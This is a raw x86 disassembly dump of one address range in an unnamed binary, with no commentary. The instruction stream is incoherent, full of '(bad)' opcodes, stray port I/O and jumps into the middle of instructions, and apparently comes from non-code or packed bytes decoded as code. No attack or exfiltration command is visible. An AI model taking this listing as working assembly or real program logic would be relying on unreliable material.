  432a90:	inc    ebp
  432a91:	jbe    0x432a95
  432a93:	pushf  
  432a94:	mov    ds,WORD PTR [esi]
  432a96:	add    BYTE PTR [ebx+ebx*1],0xf5
  432a9a:	es dec esp
  432a9d:	jp     0x432aa1
  432a9f:	add    BYTE PTR [eax-0x2b],ch
  432aa2:	jmp    0x432aa3
  432aa4:	call   0x37903dff
  432aa9:	sub    al,0x9
  432aab:	jg     0x432af7
  432aad:	jbe    0x432ab1
  432aaf:	add    cl,al
  432ab1:	sub    cl,BYTE PTR [eax]
  432ab3:	sti    
  432ab4:	(bad)  
  432ab5:	or     DWORD PTR [ebx+edx*1],ebx
  432ab8:	adc    DWORD PTR [edi-0x576e79e8],0x648e3618
  432ac2:	jle    0x432b0f
  432ac4:	call   0x25d02d3f
  432ac9:	popf   
  432aca:	out    dx,eax
  432acb:	dec    edi
  432acc:	pusha  
  432acd:	mov    ch,0xdf
  432acf:	pop    ss
  432ad0:	add    DWORD PTR [edi-0x27903a4],0x9e650a53
  432ada:	add    al,BYTE PTR [eax]
  432adc:	jmp    0xd966ead4
  432ae1:	add    BYTE PTR [eax],al
  432ae3:	add    BYTE PTR [eax],al
  432ae5:	add    dh,al
  432ae7:	sbb    esi,DWORD PTR ds:0x86189292
  432aed:	pop    ecx
  432aee:	dec    eax
  432aef:	adc    BYTE PTR [ebx+0xb],dh
  432af2:	xchg   esp,eax
  432af3:	(bad)  
  432af4:	and    edi,ecx
  432af6:	sbb    al,0x9d
  432af8:	imul   ebx,DWORD PTR [edx+0x3fae0b9e],0xffffff94
  432aff:	mov    cl,0x87
  432b01:	lods   eax,DWORD PTR ds:[esi]
  432b02:	pop    edx
  432b03:	add    al,0xe8
  432b05:	scas   al,BYTE PTR es:[edi]
  432b06:	in     eax,dx
  432b07:	pop    ss
  432b08:	cli    
  432b09:	imul   edx,ebp,0x85e90ade
  432b0f:	jle    0x432b03
  432b11:	jmp    0x95d02d8c
  432b16:	adc    ch,bl
  432b18:	out    0x0,eax
  432b1a:	dec    ebx
  432b1b:	xchg   edx,eax
  432b1c:	sti    
  432b1d:	jmp    esi
  432b1f:	add    eax,DWORD PTR [ebx+0x6b64dcc6]
  432b25:	push   ebx
  432b26:	je     0x432aeb
  432b28:	test   eax,0xba7adbfe
  432b2d:	movmskps ebx,xmm0
  432b30:	cli    
  432b31:	dec    esp
  432b33:	fs (bad) 
  432b35:	addr16 push eax
  432b37:	cmp    DWORD PTR [edx],0x0
  432b3a:	imul   ecx,DWORD PTR es:[ecx-0x18],0x42
  432b3f:	scas   al,BYTE PTR es:[edi]
  432b40:	clc    
  432b41:	call   DWORD PTR [eax-0x41]
  432b44:	add    eax,0xffff0e84
  432b49:	inc    DWORD PTR [eax]
  432b4b:	add    BYTE PTR [eax],al
  432b4d:	add    BYTE PTR [eax],al
  432b4f:	xchg   BYTE PTR [edx],cl
  432b51:	lea    eax,[ebp-0x5c]
  432b54:	dec    esi
  432b55:	fs jbe 0x432bb7
  432b58:	out    0x9a,al
  432b5a:	mov    bl,0xea
  432b5c:	loope  0x432bdc
  432b5e:	ror    BYTE PTR [ebx-0x63ff5986],0xfe
  432b65:	cmp    BYTE PTR [ebp-0x5c],bh
  432b68:	js     0x432b7a
  432b6a:	inc    DWORD PTR [ecx+0x7075f516]
  432b70:	pusha  
  432b71:	ins    DWORD PTR es:[edi],dx
  432b72:	push   ebx
  432b73:	les    ecx,FWORD PTR [eax-0x76340157]
  432b79:	mov    edx,0xfa94d00f
  432b7e:	call   FWORD PTR [ebp+ebp*1+0x7b]
  432b82:	or     al,0x0
  432b84:	repz div BYTE PTR [ebp+0x58]
  432b88:	pusha  
  432b89:	addr16 push ebx
  432b8b:	mov    ah,0xe0
  432b8d:	test   eax,0xba895bfe
  432b92:	je     0x432b9d
  432b94:	sub    eax,0x6f75107b
  432b99:	psubq  mm4,QWORD PTR [eax-0x599a53f5]
  432ba0:	repz xor eax,0x81110bae
  432ba6:	mov    edi,0x7b898289
  432bab:	push   ecx
  432bac:	inc    ebx
  432bad:	dec    eax
  432bae:	inc    ebx
  432baf:	cdq    
  432bb0:	sbb    dh,bh
  432bb2:	out    0x0,eax
  432bb4:	add    BYTE PTR [eax],al
  432bb6:	add    BYTE PTR [eax],al
  432bb8:	inc    edx
  432bb9:	das    
  432bba:	sbb    bh,dl
  432bbc:	dec    edi
  432bbd:	sbb    al,BYTE PTR [ebp+0x1598cdc2]
  432bc3:	cli    
  432bc4:	rcr    BYTE PTR [edi-0x617a8cbd],cl
  432bca:	push   edi
  432bcb:	and    esi,DWORD PTR ds:0xcdfffe1d
  432bd1:	arpl   cx,dx
  432bd3:	stc    
  432bd4:	mov    dl,0x94
  432bd6:	lahf   
  432bd7:	and    esp,DWORD PTR [ecx-0x62]
  432bda:	xchg   DWORD PTR [ebx],esp
  432bdc:	lds    ebx,FWORD PTR ds:0xcc45fffe
  432be2:	sub    esi,DWORD PTR [edx-0x78e57940]
  432be8:	xor    DWORD PTR [edi+0x9],eax
  432beb:	mov    ecx,0xfffe1a93
  432bf0:	out    dx,al
  432bf1:	imul   eax,DWORD PTR [ecx-0x1],0x74cb5b72
  432bf8:	ins    BYTE PTR es:[edi],dx
  432bf9:	xor    eax,0xffe18cfe
  432bfe:	out    dx,eax
  432bff:	out    0xeb,eax
  432c01:	mov    bl,0x1a
  432c03:	cli    
  432c04:	push   edx
  432c05:	or     al,0x26
  432c07:	mov    bl,dh
  432c09:	iret   
  432c0a:	sbb    cl,BYTE PTR [esi+0x4d]
  432c0d:	pushf  
  432c0e:	cmp    edx,0x23c7a53a
  432c14:	add    BYTE PTR [edx],0xe
  432c17:	ucomiss xmm2,xmm5
  432c1a:	adc    BYTE PTR [esi+0x0],dl
  432c20:	add    ah,dh
  432c22:	adc    BYTE PTR [ecx],dl
  432c24:	mov    bl,0x12
  432c26:	xchg   edx,eax
  432c27:	bound  ebx,QWORD PTR [edi]
  432c29:	paddq  mm5,QWORD PTR [eax]
  432c2c:	mov    edi,0x296dadac
  432c31:	mov    eax,ds:0xa003dc44
  432c36:	jge    0x432c34
  432c38:	mov    dh,BYTE PTR [ebp+eax*4-0x2c]
  432c3c:	mov    bh,0x3b
  432c3e:	mov    ecx,0xbef0054e
  432c43:	test   BYTE PTR [esp+eax*2+0x421eadd5],dh
  432c4a:	shr    BYTE PTR [ebx+0x43],cl
  432c4d:	inc    ecx
  432c4e:	leave  
  432c4f:	ins    DWORD PTR es:[edi],dx
  432c50:	enter  0xcf06,0xe8
  432c54:	add    edx,DWORD PTR ds:0x6de13602
  432c5a:	scas   eax,DWORD PTR es:[edi]
  432c5b:	pusha  
  432c5c:	cwde   
  432c5d:	bound  esi,QWORD PTR [edx+0x19aac86f]
  432c63:	cmc    
  432c64:	test   DWORD PTR [edi+0x4b1b5d10],ebx
  432c6a:	or     eax,0x7f3ecfc
  432c6f:	ins    BYTE PTR es:[edi],dx
  432c70:	ror    BYTE PTR [edx-0x7d678e4e],1
  432c76:	mov    eax,0xfec21f12
  432c7b:	imul   eax,DWORD PTR [ebx-0x1f],0xfffffff1
  432c7f:	pop    ecx
  432c80:	cwde   
  432c81:	push   0xffffffb8
  432c83:	push   ecx
  432c84:	cwde   
  432c85:	add    BYTE PTR [eax],al
  432c87:	add    BYTE PTR [eax],al
  432c89:	add    BYTE PTR [edx-0x4d],dh
  432c8c:	mov    esi,0x42ee5d01
  432c91:	push   ds
  432c92:	dec    edi
  432c93:	jge    0x432cb5
  432c95:	mov    dh,0x5a
  432c97:	pop    es
  432c98:	add    BYTE PTR [edi+0x5b],ch
  432c9b:	or     al,0x5a
  432c9d:	arpl   WORD PTR [edi+0x722bc8b8],si
  432ca3:	add    dl,BYTE PTR [ebp+0x72]
  432ca6:	push   edx
  432ca7:	nop
  432ca8:	jmp    0x432ca7
  432caa:	mul    DWORD PTR [esi+0x7ec7e9fb]
  432cb0:	inc    esp
  432cb1:	loope  0x432c79
  432cb3:	or     al,0x74
  432cb5:	aad    0xe5
  432cb7:	(bad)  
  432cb8:	neg    DWORD PTR [ecx-0x6604391b]
  432cbe:	sahf   
  432cbf:	fmul   QWORD PTR [edx-0x1a]
  432cc2:	mov    BYTE PTR [esi-0x1f92aa41],al
  432cc8:	mov    edi,0x4488acc2
  432ccd:	rcr    esp,1
  432ccf:	(bad)  
  432cd0:	sti    
  432cd1:	push   0x12
  432cd3:	sbb    al,0xff
  432cd5:	imul   ebx,DWORD PTR [edx],0x5997ff14
  432cdb:	mov    edi,0x7e5534fa
  432ce0:	inc    esp
  432ce1:	xchg   ebp,eax
  432ce2:	loope  0x432d0b
  432ce4:	cld    
  432ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432ce6:	or     BYTE PTR [edx+edi*8],0x1c
  432cea:	push   ebp
  432ceb:	test   edi,edx
  432ced:	add    DWORD PTR [eax],0x0
  432cf3:	and    eax,DWORD PTR [esi+0x38fd86fa]
  432cf9:	jae    0x432cd2
  432cfb:	popa   
  432cfc:	xchg   esi,eax
  432cfd:	repz jbe 0x432ce2
  432d00:	sbb    edi,edx
  432d02:	hlt    
  432d03:	data16 or al,0x74
  432d06:	cmc    
  432d07:	mov    DWORD PTR [esi+0xed85107],edx
  432d0d:	cli    
  432d0e:	push   esi
  432d0f:	out    dx,eax
  432d10:	ss cli 
  432d12:	aam    0xa2
  432d14:	daa    
  432d15:	mov    eax,DWORD PTR [eax]
  432d17:	fldln2 
  432d19:	cmc    
  432d1a:	mov    cl,BYTE PTR [edi-0x263c38b7]
  432d20:	jns    0x432d08
  432d22:	xor    DWORD PTR [eax-0xe],0x4a
  432d26:	push   edi
  432d27:	push   ebx
  432d28:	ja     0x432d2c
  432d2a:	lea    eax,[ecx]
  432d2c:	imul   DWORD PTR [ecx]
  432d2e:	(bad)  [ebp+eax*1+0x22]
  432d32:	inc    BYTE PTR [ebx+0x3974ba7a]
  432d38:	out    dx,al
  432d39:	jae    0x432d33
  432d3b:	xor    eax,0x79ff0650
  432d40:	test   DWORD PTR [ecx+0x73edd445],0x4347e310
  432d4a:	or     al,0x9c
  432d4c:	pop    esp
  432d4d:	cld    
  432d4e:	out    0x28,eax
  432d50:	out    dx,eax
  432d51:	cmc    
  432d52:	inc    ebx
  432d54:	ja     0x432d44
  432d56:	mov    al,BYTE PTR [eax]
  432d58:	add    BYTE PTR [eax],al
  432d5a:	add    BYTE PTR [eax],al
  432d5c:	adc    al,0xdb
  432d5e:	inc    edi
  432d5f:	test   DWORD PTR [ebx],eax
  432d61:	out    dx,al
  432d62:	push   ebp
  432d63:	mov    cl,BYTE PTR [edi]
  432d65:	dec    edx
  432d66:	mov    edx,0x8b5502d0
  432d6c:	add    BYTE PTR [esi+eiz*8+0x29814],al
  432d73:	push   ebx
  432d74:	pop    ebx
  432d75:	jns    0x432d69
  432d77:	lea    ebx,[ecx]
  432d79:	fcomip st,st(1)
  432d7b:	push   ebx
  432d7d:	push   edx
  432d7e:	(bad)  
  432d7f:	test   BYTE PTR [edx+eax*1-0x1218cd00],0x13
  432d87:	and    al,0x4f
  432d89:	inc    edx
  432d8a:	cli    
  432d8b:	inc    edi
  432d8c:	xchg   ecx,eax
  432d8d:	cmc    
  432d8e:	cli    
  432d8f:	dec    DWORD PTR [edi+esi*2+0x55]
  432d93:	lea    esi,[ebp-0x62]
  432d96:	adc    bh,ah
  432d98:	push   edx
  432d99:	mov    ebp,0xe3dd4eae
  432d9e:	mov    edi,DWORD PTR [edi]
  432da0:	jne    0x432d40
  432da2:	sub    ebx,0x4f1bd53e
  432da8:	xor    dh,BYTE PTR [edi]
  432daa:	out    dx,al
  432dab:	adc    BYTE PTR [ebp-0x56407ee5],dh
  432db1:	pop    edx
  432db2:	mov    DWORD PTR [ecx+eiz*1-0x5a05e409],eax
  432db9:	add    ebx,DWORD PTR [esi-0x7cfaf4d8]
  432dbf:	mov    edi,0x0
  432dc4:	add    BYTE PTR [ecx+0x184894a],cl
  432dca:	pop    ss
  432dcb:	push   ss
  432dcc:	cli    
  432dcd:	inc    ebp
  432dce:	add    ebp,DWORD PTR [edx+0x68]
  432dd1:	jmp    0x16fa:0x69bf7f24
  432dd8:	je     0x432e47
  432dda:	mov    al,ds:0xae2503be
  432ddf:	xor    bl,0xc8
  432de2:	inc    esp
  432de3:	push   ss
  432de4:	dec    edi
  432de5:	int    0xdb
  432de7:	push   ss
  432de8:	cli    
  432de9:	mov    edx,0xf88c3ba1
  432dee:	push   edi
  432def:	sbb    dl,bh
  432df1:	stos   BYTE PTR es:[edi],al
  432df2:	retf   
  432df3:	sub    ebp,DWORD PTR [ebx]
  432df5:	dec    esp
  432df6:	ins    DWORD PTR es:[edi],dx
  432df7:	push   ss
  432df8:	pop    edx
  432df9:	out    dx,eax
  432dfa:	pop    eax
  432dfb:	mov    edx,0xfe27b7c8
  432e00:	push   esp
  432e01:	(bad)  
  432e02:	ja     0x432d88
  432e04:	jmp    0x432e5f
  432e06:	sbb    esi,edi
  432e08:	jmp    DWORD PTR [ebx]
  432e0a:	in     al,dx
  432e0b:	sub    ebx,DWORD PTR [edi+0x65169c81]
  432e11:	jbe    0x432e15
  432e13:	push   ss
  432e14:	ss mov ebp,0x50875715
  432e1a:	add    bl,ch
  432e1c:	lock mov eax,0xb142df96
  432e22:	or     ch,dl
  432e24:	add    esi,DWORD PTR [ebp+0x2]
  432e27:	dec    esi
  432e28:	hlt    
  432e29:	add    BYTE PTR [eax],al
  432e2b:	add    BYTE PTR [eax],al
  432e2d:	add    BYTE PTR [edi],dh
  432e2f:	(bad)  
  432e30:	xor    BYTE PTR [eax],al
  432e32:	jne    0x432e36
  432e34:	jmp    0xab88a567
  432e39:	sbb    esp,DWORD PTR [eax]
  432e3b:	or     eax,0x19303e8
  432e40:	rcl    DWORD PTR fs:[edx+esi*4],0x7e
  432e45:	add    edx,DWORD PTR [ebx+0x682ba101]
  432e4b:	(bad)  
  432e4c:	stc    
  432e4d:	sbb    dl,BYTE PTR [eax-0x25e6f24]
  432e53:	mov    BYTE PTR [ecx+ecx*4],0xf1
  432e57:	sub    eax,0xb1df1ae3
  432e5c:	ins    DWORD PTR es:[edi],dx
  432e5d:	shl    dl,0xfe
  432e60:	call   0x3949a368
  432e65:	mov    DWORD PTR [ecx],esi
  432e67:	sbb    BYTE PTR es:[edx-0x6],bl
  432e6b:	and    DWORD PTR ds:0xe8982704,esp
  432e71:	sub    edi,DWORD PTR [edx-0xce5567d]
  432e77:	or     DWORD PTR [ebx+0x1a],ebp
  432e7a:	sub    DWORD PTR [esi],eax
  432e7c:	xlat   BYTE PTR ds:[ebx]
  432e7d:	inc    ebx
  432e7e:	xchg   ebx,eax
  432e7f:	fsub   QWORD PTR [ebx-0x40]
  432e82:	mov    ds:0xfb2c32b1,al
  432e87:	in     al,0x82
  432e89:	sbb    dh,dh
  432e8b:	inc    ecx
  432e8c:	repz hlt 
  432e8e:	adc    dl,bh
  432e90:	jmp    DWORD PTR [ebx+0x0]
  432e93:	add    BYTE PTR [eax],al
  432e95:	add    BYTE PTR [eax],al
  432e97:	xor    eax,0x26e9651c
  432e9c:	or     DWORD PTR [ecx+edi*4],edx
  432e9f:	fs int3 
  432ea1:	jmp    FWORD PTR [ecx-0x66]
  432ea4:	idiv   edx
  432ea6:	fsubr  QWORD PTR [esi+0x7e]
  432ea9:	inc    esp
  432eaa:	pop    ecx
  432eab:	push   es
  432eac:	mov    cl,0x86
  432eae:	les    ebp,FWORD PTR [esi+0x1a]
  432eb1:	xchg   esi,eax
  432eb2:	neg    BYTE PTR [eax+ecx*1+0x5a]
  432eb6:	xchg   edi,eax
  432eb7:	ror    DWORD PTR [ebp+0x3],0xe9
  432ebb:	mov    dl,0x37
  432ebd:	retf   
  432ebe:	xor    eax,0x2dcb37ba
  432ec3:	mov    dl,0x37
  432ec5:	retf   
  432ec6:	mov    esp,0x62501803
  432ecb:	cmp    al,0xe8
  432ecd:	xchg   BYTE PTR [edi+0x6c00a602],bl
  432ed3:	xor    eax,0x299e4f09
  432ed8:	or     ebp,ecx
  432eda:	push   0xffffffaa
  432edc:	sti    
  432edd:	jle    0x432ec0
  432edf:	jbe    0x432e76
  432ee1:	or     ch,dh
  432ee3:	inc    esp
  432ee4:	(bad)  
  432ee5:	cli    
  432ee6:	bound  edi,QWORD PTR [edx-0x5e1776fd]
  432eec:	dec    ebx
  432eed:	xchg   ah,cl
  432eef:	or     cl,BYTE PTR [ebp-0x7a]
  432ef2:	pop    ss
  432ef3:	mov    ebp,0xe5d14184
  432ef8:	mov    ebp,0x99fa
  432efd:	add    BYTE PTR [eax],al
  432eff:	add    al,dh
  432f01:	aas    
  432f02:	pop    es
  432f03:	sahf   
  432f04:	popa   
  432f05:	hlt    
  432f06:	mov    edi,0xbeae7a72
  432f0b:	cmp    al,0x0
  432f0d:	sbb    BYTE PTR [eax+0x3a],dl
  432f10:	(bad)  
  432f11:	mov    al,0x86
  432f13:	add    ah,dh
  432f15:	add    DWORD PTR [ebx-0x4],0x7
  432f19:	out    dx,eax
  432f1a:	dec    edx
  432f1b:	(bad)  
  432f1c:	mov    eax,ds:0x5cfffaea
  432f21:	jmp    edi
  432f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432f24:	fucomi st,st(1)
  432f26:	cmc    
  432f27:	mov    ebx,DWORD PTR [ecx]
  432f29:	repz jns 0x432ef0
  432f2c:	pusha  
  432f2d:	mov    WORD PTR [edx+0x4b837075],?
  432f33:	cld    
  432f34:	fst    st(6)
  432f36:	mov    edi,?
  432f38:	jnp    0x432f23
  432f3a:	jns    0x432f00
  432f3c:	and    BYTE PTR [edx+edi*4+0x537e4075],cl
  432f43:	cld    
  432f44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432f45:	inc    ebx
  432f46:	add    bl,BYTE PTR [edi+0x4d]
  432f49:	in     al,0x2
  432f4b:	or     ecx,DWORD PTR [edi+0x48]
  432f4e:	xchg   DWORD PTR [ecx],edx
  432f50:	(bad)  
  432f51:	jge    0x432f36
  432f53:	pop    ebp
  432f54:	dec    edi
  432f55:	jge    0x432faa
  432f57:	or     bl,bl
  432f59:	dec    eax
  432f5a:	mov    ebp,0xfffedc02
  432f5f:	inc    DWORD PTR [edi]
  432f61:	jle    0x432f46
  432f63:	pop    ebp
  432f64:	add    BYTE PTR [eax],al
  432f66:	add    BYTE PTR [eax],al
  432f68:	add    BYTE PTR [edi],cl
  432f6a:	ret    
  432f6b:	(bad)  
  432f6c:	int3   
  432f6d:	or     bl,al
  432f6f:	(bad)  
  432f70:	int3   
  432f71:	xchg   ecx,eax
  432f72:	jge    0x432f5a
  432f74:	push   ecx
  432f75:	(bad)  
  432f76:	push   eax
  432f77:	dec    ebp
  432f78:	mov    esi,DWORD PTR [ebx+eax*4-0xfb803bd]
  432f7f:	dec    edx
  432f80:	(bad)  
  432f81:	popa   
  432f82:	jmp    0x45e7:0xfe9cfffa
  432f89:	fucomi st,st(1)
  432f8b:	cmc    
  432f8c:	mov    ecx,DWORD PTR [ecx-0x16]
  432f8f:	jns    0x432f55
  432f91:	jne    0x432fb0
  432f93:	mov    ebx,eax
  432f95:	lock pop eax
  432f97:	mov    DWORD PTR [edx],ecx
  432f99:	lock aad 0x17
  432f9c:	push   eax
  432f9d:	lea    ecx,[eax+0x17]
  432fa0:	cli    
  432fa1:	jb     0x432f48
  432fa3:	sar    ebx,0xf6
  432fa6:	pop    edi
  432fa7:	cli    
  432fa8:	xchg   BYTE PTR [ebx+ebx*8+0x24],al
  432fac:	pop    es
  432fad:	outs   dx,BYTE PTR ds:[esi]
  432fae:	lds    edi,FWORD PTR [ecx-0x41]
  432fb1:	enter  0x8120,0x44
  432fb5:	dec    ecx
  432fb6:	dec    esp
  432fb7:	adc    DWORD PTR es:[edx-0x3f],eax
  432fbb:	pop    ss
  432fbc:	xchg   BYTE PTR [eax+0x79c383c7],ch
  432fc2:	ficomp DWORD PTR ds:0x79f27e0f
  432fc8:	mov    edi,0x4c8137a8
  432fcd:	add    BYTE PTR [eax],al
  432fcf:	add    BYTE PTR [eax],al
  432fd1:	add    BYTE PTR [ecx],bl
  432fd3:	dec    ebx
  432fd4:	es stc 
  432fd6:	adc    esi,ecx
  432fd8:	pop    ss
  432fd9:	jle    0x43300c
  432fdb:	and    BYTE PTR [ecx-0x41],bh
  432fde:	mov    BYTE PTR [edi],ah
  432fe0:	mov    edx,DWORD PTR [ecx+edi*8-0x6c]
  432fe4:	rol    DWORD PTR [edi],0x52
  432fe7:	fisub  DWORD PTR [edi+edx*1]
  432fea:	jbe    0x432fd8
  432fec:	mov    eax,0x86c48488
  432ff1:	in     al,0x38
  432ff3:	pop    esp
  432ff4:	xchg   BYTE PTR [ebp+edi*2-0x30],dl
  432ff8:	mov    cl,0xc2
  432ffa:	ja     0x433017
  432ffc:	(bad)  
  432ffd:	push   DWORD PTR [ebp-0x1c]
  433000:	xchg   ah,ah
  433002:	sbb    BYTE PTR [edi+eax*2-0x35],bl
  433006:	shl    esi,0x86
  433009:	jmp    0x433001
  43300b:	inc    edi
  43300c:	pop    es
  43300d:	dec    edi
  43300e:	dec    ebx
  43300f:	add    bh,BYTE PTR [edx]
  433011:	mov    esp,DWORD PTR [edx-0x4e7dc89]
  433017:	adc    edi,DWORD PTR [eax]
  433019:	aas    
  43301a:	xor    DWORD PTR [esi],eax
  43301c:	call   0x9145a524
  433021:	push   ebx
  433022:	jl     0x43302d
  433024:	jns    0x432fb1
  433026:	cmp    bh,BYTE PTR [ebp+0x2b]
  433029:	sbb    BYTE PTR ds:0xfa00a485,cl
  43302f:	sub    DWORD PTR [edi-0x4f],ebp
  433032:	bound  edi,QWORD PTR [edi+0x2f]
  433035:	xchg   ecx,eax
  433036:	add    BYTE PTR [eax],al
  433038:	add    BYTE PTR [eax],al
  43303a:	add    BYTE PTR [edi+esi*2-0x5d],bh
  43303e:	pop    ss
  43303f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433040:	sbb    dh,BYTE PTR [eax+0x16]
  433043:	aas    
  433044:	or     DWORD PTR [ebp+0x40],esp
  433047:	jbe    0x4330c6
  433049:	xor    BYTE PTR [ebx+0x74f06b9],cl
  43304f:	rol    DWORD PTR [ebx-0x20],1
  433052:	or     al,0xc8
  433054:	or     ah,BYTE PTR [edi]
  433056:	and    al,0x72
  433058:	std    
  433059:	inc    eax
  43305a:	cmp    DWORD PTR ds:0xa188e28f,0x842bb606
  433064:	or     BYTE PTR [ecx],al
  433066:	pop    ss
  433067:	jnp    0x4330a7
  433069:	in     al,0x8a
  43306b:	mov    edx,0xd17ab7c
  433070:	stc    
  433071:	inc    esp
  433072:	inc    edx
  433073:	jb     0x433070
  433075:	cmp    ebx,DWORD PTR [esi*4-0x52f507df]
  43307c:	jle    0x43301d
  43307e:	nop
  43307f:	jl     0x4330f8
  433081:	and    ebx,DWORD PTR [eax]
  433083:	xor    bl,BYTE PTR [edx]
  433085:	sbb    al,0x16
  433087:	mov    edi,0x763f6508
  43308c:	jge    0x43308d
  43308e:	mov    al,ds:0x50fbbdff
  433093:	jnp    0x4330f3
  433095:	mov    ebp,0xf7af6801
  43309a:	test   al,0x56
  43309c:	icebp  
  43309d:	push   es
  43309e:	mov    cl,0x0
  4330a0:	add    BYTE PTR [eax],al
  4330a2:	add    BYTE PTR [eax],al
  4330a4:	cmc    
  4330a5:	cmp    DWORD PTR [edi+ebx*8-0x13],esi
  4330a9:	mov    ch,0xfb
  4330ab:	sbb    BYTE PTR [ecx-0x29],cl
  4330ae:	stc    
  4330af:	jle    0x43303c
  4330b1:	mov    bl,al
  4330b3:	in     eax,dx
  4330b4:	(bad)  
  4330b5:	aas    
  4330b6:	xchg   BYTE PTR [edi*2+0x7eac086a],ah
  4330bd:	jle    0x433087
  4330bf:	aam    0x78
  4330c1:	jne    0x433117
  4330c3:	push   ebp
  4330c4:	add    al,0x20
  4330c6:	sbb    BYTE PTR [edi+0x6b],cl
  4330c9:	or     al,0x7e
  4330cb:	sub    eax,0x72c7813a
  4330d0:	xor    eax,0x5628980c
  4330d5:	dec    DWORD PTR [eax]
  4330d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4330d8:	jle    0x433158
  4330da:	enter  0x709c,0x75
  4330de:	inc    esp
  4330df:	sbb    eax,0x14fc1fc6
  4330e4:	arpl   WORD PTR [esi+edi*2],cx
  4330e7:	and    eax,0x72c78102
  4330ec:	xor    eax,0x9628980c
  4330f1:	test   DWORD PTR [eax],0xc87e8eac
  4330f7:	je     0x4330c0
  4330f9:	jbe    0x433147
  4330fb:	in     eax,0x26
  4330fd:	and    al,ah
  4330ff:	fsubr  QWORD PTR [eax+0xc]
  433102:	xchg   BYTE PTR [ecx+0x640343f4],ah
  433108:	add    BYTE PTR [eax],al
  43310a:	add    BYTE PTR [eax],al
  43310c:	add    BYTE PTR [esi],ch
  43310e:	mov    fs,WORD PTR [eax]
  433110:	add    BYTE PTR [edi+0x47],al
  433113:	neg    BYTE PTR [ecx+0x4581ce27]
  433119:	xchg   esp,eax
  43311a:	xor    dh,al
  43311c:	or     ebx,edi
  43311e:	ret    
  43311f:	fcomp  QWORD PTR [eax]
  433121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433122:	pop    eax
  433123:	repnz pop edi
  433125:	add    eax,0x4c89582e
  43312a:	add    al,BYTE PTR [ebx-0x1c86b83f]
  433130:	pop    ebp
  433131:	iret   
  433132:	jns    0x433177
  433134:	or     BYTE PTR [ebx+0x5c00bd50],dl
  43313a:	add    eax,DWORD PTR [eax]
  43313c:	add    BYTE PTR [ebx],bl
  43313e:	ds (bad) 
  433140:	dec    DWORD PTR [ebx+eax*1+0x0]
  433144:	mov    ebx,DWORD PTR [ebp+0x1e58149]
  43314a:	ret    0xccc6
  43314d:	pusha  
  43314e:	mov    edx,0xba80ccc6
  433153:	(bad)  
  433154:	int3   
  433155:	pusha  
  433156:	mov    edx,0x7a09ccc6
  43315b:	out    0x83,al
  43315d:	pusha  
  43315e:	and    cl,BYTE PTR [ecx-0x75]
  433161:	xor    edi,edi
  433163:	dec    ebp
  433164:	push   edi
  433165:	xchg   DWORD PTR [edi+0x2],ebp
  433168:	xor    ebp,DWORD PTR [edx+0x5c]
  43316b:	cld    
  43316c:	push   ebp
  43316d:	retf   0x4d51
  433170:	mov    DWORD PTR [eax],0x0
  433176:	leave  
  433177:	div    ch
  433179:	(bad)  
  43317a:	fadd   QWORD PTR [edx]
  43317c:	mov    DWORD PTR [ebp-0x1c],esi
  43317f:	jnp    0x4331f4
  433181:	in     al,0x55
  433183:	ja     0x433167
  433185:	call   0x3d5e82
  43318a:	pop    edi
  43318b:	(bad)  
  43318c:	push   cs
  43318d:	test   DWORD PTR [ebp+0x59],esi
  433190:	mov    al,BYTE PTR [esi]
  433192:	and    dl,bh
  433194:	sar    BYTE PTR [edi-0x7948947a],1
  43319a:	cwde   
  43319b:	in     eax,0x40
  43319d:	dec    esi
  43319e:	inc    edx
  43319f:	inc    ecx
  4331a0:	pop    ss
  4331a1:	cmp    DWORD PTR [ebp+0x19],esi
  4331a4:	xchg   ebp,esi
  4331a6:	not    BYTE PTR [esi+eax*1-0x79]
  4331aa:	lods   eax,DWORD PTR ds:[esi]
  4331ab:	xchg   ecx,eax
  4331ac:	mov    cl,0xdb
  4331ae:	cld    
  4331af:	in     eax,dx
  4331b0:	and    eax,DWORD PTR [edx+eax*4+0x6d6dedef]
  4331b7:	call   0x6efe:0x1c72fa17
  4331be:	jge    0x433162
  4331c0:	mov    cl,0xf3
  4331c2:	in     al,dx
  4331c3:	push   ss
  4331c4:	push   ss
  4331c5:	xchg   BYTE PTR [edx+0x34],ah
  4331c8:	cli    
  4331c9:	add    esi,DWORD PTR [ebp+0x1b]
  4331cc:	test   al,0x0
  4331ce:	fistp  WORD PTR [ebx]
  4331d0:	adc    edx,DWORD PTR [ecx+eiz*2]
  4331d3:	out    0xbf,eax
  4331d5:	push   edi
  4331d7:	xlat   BYTE PTR ds:[ebx]
  4331d8:	add    cl,BYTE PTR [ecx+0x0]
  4331de:	add    BYTE PTR [eax-0x5e408639],bh
  4331e4:	mov    edi,ecx
  4331e6:	enter  0x1fdf,0xfe
  4331ea:	push   DWORD PTR [ebp+0x20]
  4331ed:	inc    esp
  4331ee:	or     bh,dl
  4331f0:	out    dx,eax
  4331f1:	(bad)  
  4331f2:	push   DWORD PTR [ebp-0x60]
  4331f5:	mov    ecx,0xd71687f3
  4331fa:	iret   
  4331fb:	push   0xffffff98
  4331fd:	sbb    edi,edi
  4331ff:	repnz sbb esp,DWORD PTR [edi]
  433202:	push   cs
  433203:	add    eax,0xeedbb1a1
  433208:	mov    ss,WORD PTR [esi]
  43320a:	xchg   BYTE PTR [eax+0x2],al
  43320d:	aad    0x7f
  43320f:	inc    ecx
  433210:	adc    ch,BYTE PTR [ebp-0x6f]
  433213:	stos   BYTE PTR es:[edi],al
  433214:	jns    0x433241
  433216:	sbb    ch,dh
  433218:	inc    eax
  433219:	call   0x6645a725
  43321e:	xor    eax,0x96aac8b2
  433223:	jl     0x4331b2
  433225:	in     al,dx
  433226:	into   
  433227:	mov    dl,0x8c
  433229:	loopne 0x4332a7
  43322b:	xor    DWORD PTR [esi],edx
  43322d:	outs   dx,DWORD PTR ds:[esi]
  43322e:	cdq    
  43322f:	mov    ds:0x217ce219,al
  433234:	push   ss
  433235:	pop    edi
  433236:	rcl    DWORD PTR [edx-0xcdbdc87],0x11
  43323d:	int    0x98
  43323f:	pop    esi
  433240:	jns    0x4331ef
  433242:	out    dx,eax
  433243:	add    BYTE PTR [eax],al
  433245:	add    BYTE PTR [eax],al
  433247:	add    cl,ch
